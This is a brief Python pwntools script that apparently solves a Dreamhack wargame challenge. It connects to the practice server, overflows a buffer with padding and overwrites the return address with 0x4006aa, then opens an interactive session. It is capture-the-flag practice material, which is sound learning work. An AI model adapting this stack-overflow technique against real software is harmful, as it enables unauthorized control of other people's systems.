from pwn import *

p = remote("host1.dreamhack.games", 9642)

# ret_address = int(b"0x00000000004006aa",16)

code = b"A"*0x30
code += b"B"*0x8
code += p64(0x4006aa)

print(code)
p.recvuntil(b"Input: ")
p.send(code)
p.interactive()
p.close()